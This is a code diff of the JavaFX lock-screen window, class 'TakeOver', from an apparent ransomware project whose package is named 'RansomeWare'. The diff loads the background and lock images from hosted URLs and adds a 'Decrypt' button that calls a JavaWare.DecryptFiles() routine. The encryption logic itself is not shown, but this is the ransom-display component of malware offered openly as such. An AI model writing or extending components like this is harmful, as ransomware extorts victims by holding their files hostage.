@@ -21,15 +21,15 @@
 package RansomeWare;
 
 import javafx.application.Application;
+import javafx.event.ActionEvent;
+import javafx.event.EventHandler;
 import javafx.geometry.Insets;
 import javafx.geometry.Pos;
 import javafx.scene.Scene;
+import javafx.scene.control.Button;
 import javafx.scene.image.Image;
 import javafx.scene.image.ImageView;
-import javafx.scene.layout.Background;
-import javafx.scene.layout.BackgroundFill;
-import javafx.scene.layout.CornerRadii;
-import javafx.scene.layout.GridPane;
+import javafx.scene.layout.*;
 import javafx.scene.paint.Color;
 import javafx.scene.text.Font;
 import javafx.scene.text.FontWeight;
@@ -50,7 +50,7 @@ public class TakeOver extends Application {
         grid.setAlignment(Pos.CENTER);
         grid.setHgap(10);
         grid.setVgap(10);
-        grid.setStyle("-fx-background-image: url(\"Ransomeware/background.png\");");
+        grid.setStyle("-fx-background-image: url('https://i.ibb.co/Sc7BvhL/background.png');");
         Scene scene = new Scene(grid, 1200, 800);
         primaryStage.setScene(scene);
 
@@ -59,7 +59,7 @@ public class TakeOver extends Application {
         grid.setHgap(0);
         grid.setVgap(0);
 
-        Image lock = new Image("Ransomeware" + File.separator + "lock.png");
+        Image lock = new Image("https://i.ibb.co/fDDZ26F/lock.png");
         ImageView lockView = new ImageView();
         lockView.setFitHeight(300);
         lockView.setFitWidth(300);
@@ -98,6 +98,24 @@ public class TakeOver extends Application {
         address.setTextAlignment(TextAlignment.CENTER);
         address.wrappingWidthProperty().bind(gridPane.widthProperty());
         gridPane.add(address, 0,4);
+
+
+        Button b = new Button("Decrypt");
+        gridPane.add(b, 1, 6);
+
+        EventHandler<ActionEvent> event = new EventHandler<ActionEvent>() {
+            @Override
+            public void handle(ActionEvent actionEvent) {
+                try {
+                    JavaWare jw = new JavaWare();
+                    jw.DecryptFiles();
+                } catch(Exception e) {
+
+                }
+            }
+        };
+
+        b.setOnAction(event);
 
         primaryStage.show();
     }
